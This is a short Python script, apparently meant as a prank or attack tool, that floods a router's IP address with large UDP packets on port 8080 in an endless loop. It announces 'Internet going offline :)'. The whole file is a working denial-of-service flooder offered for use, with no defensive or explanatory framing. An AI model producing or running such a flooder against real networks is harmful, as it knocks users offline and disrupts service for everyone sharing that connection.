from sys import exit
from socket import socket, AF_INET, SOCK_DGRAM
ip = input("Enter Your Router's IP (Or Press Enter For 192.168.0.1): ")
if len(ip) == 0:
	ip = '192.168.0.1'
sent, port, data, socket = 0, 8080, bytes("◌󠇯◌󠇯◌".encode())*1000, socket(AF_INET, SOCK_DGRAM)
print(f"Spamming {ip}:{port}... Internet going offline :)")
while True:
	try: sent += int(bool(socket.sendto(data,(ip, port))))
	except: exit(print(f"Exiting... Total Packets Sent: {sent}"))